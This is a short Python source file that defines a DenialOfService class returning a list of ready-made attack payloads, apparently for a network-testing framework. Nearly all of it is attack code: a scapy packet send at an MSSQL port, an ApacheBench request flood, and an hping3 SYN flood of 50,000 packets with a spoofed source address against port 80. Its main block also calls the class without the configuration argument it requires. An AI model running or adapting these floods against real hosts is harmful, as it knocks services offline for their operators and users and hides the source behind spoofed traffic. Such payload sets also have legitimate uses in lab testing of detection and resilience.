#!/usr/bin/env python

import ConfigParser

class DenialOfService():
    def __init__(self, target, cnf):
        # Read configuration
        self.config = ConfigParser.RawConfigParser()
        self.config.read(cnf)

        self._target = target
        self.payloads = []

    def getPayloads(self):

        ### DoS against MSSQL
        self.payloads.append([
            "DoS against MSSQL",
            "scapy",
            """sr1(IP(dst="%target%")/TCP(dport=1433)/"0"*1000, verbose=0)""",
            ""
        ])

        ### AB DoS - Added by Robert Pallas
        self.payloads.append([
            "ApacheBench DoS",
            "command",
            "%ab% -k -c 25 -n 10000 http://%target%/",
            ""
        ])
        ### hping SYN flood against apache with spoofed IP - Added by Robert Pallas
        self.payloads.append([
            "hping SYN flood",
            "command",
            [self.config.get('ENV','sudo'), self.config.get('ENV','hping3'), self._target, '-S', '--faster', '-p', '80', '-I', self.config.get('CLIENT','iface'), '-c', '50000', '-a', '1.2.3.4'],
            ""
        ])

        return self.payloads

if __name__ == "__main__":
    print DenialOfService("192.168.100.48").getPayloads()
